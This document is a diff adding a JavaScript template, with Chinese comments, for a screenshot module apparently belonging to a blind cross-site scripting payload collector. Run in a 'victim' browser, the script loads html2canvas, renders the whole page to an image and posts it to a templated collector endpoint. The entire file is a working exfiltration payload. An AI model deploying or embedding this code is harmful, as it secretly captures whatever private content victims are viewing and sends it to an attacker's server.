@@ -1,0 +1,47 @@
+// screenshot.js.tmpl — 頁面截圖模組（預設啟用）。
+//
+// 用內嵌的 html2canvas（collector 同源服務，受害者瀏覽器不做任何第三方
+// 請求）把整頁渲染成 dataURL 後回傳。伺服器端另有 XssMaxCaptureBytes
+// 上限，這裡先做客戶端截斷避免白傳。
+(function () {
+  "use strict";
+  var TOKEN = {{ .Token | printf "%q" }};
+  var BASE = {{ .CaptureBase | printf "%q" }};
+  var LIB = {{ .Html2CanvasURL | printf "%q" }};
+  var MAX = {{ .MaxBytes }};
+
+  function post(dataURL) {
+    var body = "kind=screenshot&data=" + encodeURIComponent(dataURL || "");
+    if (body.length > MAX) {
+      // base64 尾端截斷會壞圖；寧可回傳空值也不送半張。
+      body = "kind=screenshot&data=truncated";
+    }
+    var x = new XMLHttpRequest();
+    x.open("POST", BASE + "/" + TOKEN, true);
+    x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    x.send(body);
+  }
+
+  function run() {
+    if (typeof window.html2canvas !== "function") {
+      var s = document.createElement("script");
+      s.src = LIB;
+      s.onload = function () { go(); };
+      s.onerror = function () { post(""); };
+      document.documentElement.appendChild(s);
+    } else {
+      go();
+    }
+  }
+
+  function go() {
+    try {
+      window.html2canvas(document.body, { logging: false })
+        .then(function (canvas) { post(canvas.toDataURL("image/jpeg", 0.6)); },
+              function () { post(""); });
+    } catch (e) { post(""); }
+  }
+
+  if (document.readyState === "complete") { run(); }
+  else { window.addEventListener("load", run); }
+})();
